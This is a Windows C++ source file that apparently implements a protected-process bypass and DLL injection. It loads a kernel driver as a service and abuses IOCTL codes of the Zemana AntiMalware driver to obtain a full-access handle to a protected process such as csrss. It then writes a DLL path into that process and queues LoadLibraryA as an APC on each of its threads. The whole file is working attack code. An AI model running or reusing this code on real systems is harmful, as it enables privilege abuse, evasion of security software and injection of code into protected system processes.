#include "Utility.h"
// TEXT 오류시 사용
#include <winnt.rh>
#pragma warning (disable:4996)

// Undocumented Function type definition
typedef NTSTATUS(NTAPI *MyNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID* cl_id);
typedef NTSTATUS(NTAPI *MyNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext OPTIONAL, PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, ULONG ApcReserved OPTIONAL);
typedef HMODULE(WINAPI *MyLoadLibrary)(_In_ LPCSTR lpLibFileName);

// Get undocumented function address
MyNtOpenThread fpNtOpenThread = (MyNtOpenThread)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtOpenThread");
MyNtQueueApcThread fpNtQueueApcThread = (MyNtQueueApcThread)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQueueApcThread");
MyLoadLibrary fpLoadLibrary = (MyLoadLibrary)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");

HWND FindConsoleHandle()
{
	HWND ret = 0;
	SetConsoleTitleA("Tester");
	while (!ret)
	{
		ret = FindWindowA(NULL, "Tester");
	}
	return ret;
}
BOOL set_privilege(LPSTR prv_name) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tempTP;
	LUID tempLUID;
	/*
		#define SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L)
		#define SE_PRIVILEGE_ENABLED            (0x00000002L)
		#define SE_PRIVILEGE_REMOVED            (0X00000004L)
		#define SE_PRIVILEGE_USED_FOR_ACCESS    (0x80000000L)
	*/

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		ERROR_MACRO("OpenProcessToken");
		return FALSE;
	}

	if (!LookupPrivilegeValueA(NULL, prv_name, &tempLUID)) {
		ERROR_MACRO("LookupPrivilesgeValueA");
		return FALSE;
	}
	tempTP.PrivilegeCount = 1; // size of array
	tempTP.Privileges->Luid = tempLUID;
	tempTP.Privileges->Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tempTP, sizeof(tempTP), NULL, NULL)) {
		ERROR_MACRO("AdjustTokenPrivileges");
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}
BOOL DriverLoader(HANDLE service_mgr, LPSTR service_name, LPSTR driver_name)
{
	HANDLE hService;
	char driver_path[256] = { 0, };
	// CreateServiceA only using fully-qualified path.
	// So, I can't using relative path.
	GetCurrentDirectoryA(256, driver_path);
	strncat(driver_path, "\\Driver\\", 10);
	strncat(driver_path, driver_name, strlen(driver_name));
	if (!(hService = CreateServiceA(
		(SC_HANDLE)service_mgr,
		service_name, // ServiceName
		service_name, // DisplayName
		SERVICE_START | DELETE | SERVICE_STOP,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,
		driver_path, // DriverPath
		NULL, NULL, NULL, NULL, NULL
	))){
		ERROR_MACRO("CreateService");
	}
	if (!(hService = OpenServiceA((SC_HANDLE)service_mgr, service_name, SERVICE_START | DELETE | SERVICE_STOP))) {
		ERROR_MACRO("OpenServiceA");
		return FALSE;
	}
	else {
		if (!StartServiceA((SC_HANDLE)hService, 0, NULL)){
			ERROR_MACRO("StartService");
			return FALSE;
		}
	}
	return TRUE;
}
HANDLE GetPPLHandle(DWORD pid) {
	HANDLE hDevice, hProcess;
	DWORD myPid;

	hDevice = CreateFile(
		"\\\\.\\ZemanaAntiMalware",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (!hDevice)
	{
		printf("Can't not find device driver..\n");
		return 0;
	}
	// Registering my process with the driver
	myPid = GetCurrentProcessId();
	if (!DeviceIoControl(hDevice, 0x80002010, &myPid, sizeof(DWORD), NULL, 0, NULL, NULL)) {
		CloseHandle(hDevice);
		return 0;
	}
	// Using IOCTL to get full access process handle
	DeviceIoControl(hDevice, 0x8000204C, &pid, sizeof(DWORD), &hProcess, sizeof(HANDLE), NULL, NULL);
	CloseHandle(hDevice);
	return hProcess;
}
DWORD ImageNameToProcessId(const char* ImageName) {
	PROCESSENTRY32 ProcessEntry;
	HANDLE hSnapShot;

	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!hSnapShot) {
		ERROR_MACRO("CreateToolhelp32Snapshot");
		return 0;
	}
	Process32First(hSnapShot, &ProcessEntry);
	do {
		if (!strncmp(ProcessEntry.szExeFile, ImageName, strlen(ImageName))) {
			DWORD session_id;
			ProcessIdToSessionId(ProcessEntry.th32ProcessID, &session_id);
			if (session_id == 1) // check only session1
				return ProcessEntry.th32ProcessID;
		}
	} while (Process32Next(hSnapShot, &ProcessEntry));
	return 0;
}
BOOL DllLoader(LPSTR dll_name, LPSTR proc_name) {
	char dll_path[256] = { 0, };
	HANDLE hTool, hThread, hBypass;
	THREADENTRY32 te;
	DWORD targetPID = 0;
	LPVOID target_mem_dll_path;

	targetPID = ImageNameToProcessId(proc_name);
	hBypass = GetPPLHandle(targetPID);

	// Get dll path
	GetCurrentDirectoryA(256, dll_path);
	strncat(dll_path, "\\", 2);
	strncat(dll_path, dll_name, strlen(dll_name));
	printf("dll_path : %s\n", dll_path);

	// Write dll path in target process memory
	target_mem_dll_path = VirtualAllocEx(hBypass, NULL, strlen(dll_path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!WriteProcessMemory(hBypass, target_mem_dll_path, dll_path, strlen(dll_path) + 1, NULL))
		ERROR_MACRO("WriteProcessMemory");

	// All thread finding
	hTool = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	te.dwSize = sizeof(THREADENTRY32);
	Thread32First(hTool, &te);
	do {
		// if target find(csrss) then
		if (te.th32OwnerProcessID == targetPID) {
			std::cout << "[STATUS] Found Thread : " << te.th32OwnerProcessID << std::endl;
			CLIENT_ID cid;
			// Initialize target pid and tid
			cid.UniqueProcess = (HANDLE)te.th32OwnerProcessID;
			cid.UniqueThread = (HANDLE)te.th32ThreadID;
			std::cout << "[STATUS] cid.UniqueProcess : " << cid.UniqueProcess << std::endl;
			std::cout << "[STATUS] cid.UniqueTHread : " << cid.UniqueThread << std::endl;
			std::cout << "[STATUS] Found Thread " << std::endl;
			hThread = OpenThread(GENERIC_ALL, 0, (DWORD)cid.UniqueThread);
			std::cout << "hThread : " << hThread << std::endl;
			if (hThread) {
				std::cout << "Thread Opend!" << std::endl;
				SuspendThread(hThread);
				auto ret = fpNtQueueApcThread(hThread,
					(PIO_APC_ROUTINE)fpLoadLibrary, target_mem_dll_path, NULL, NULL);
				printf_s("Ret 0x%p\nError 0x%p\n", ret, GetLastError());
				ResumeThread(hThread);
				CloseHandle(hThread);
			}
		}
	} while (Thread32Next(hTool, &te));
	std::cout << "NtQueueApcThread ended.." << std::endl;
	return TRUE;
}
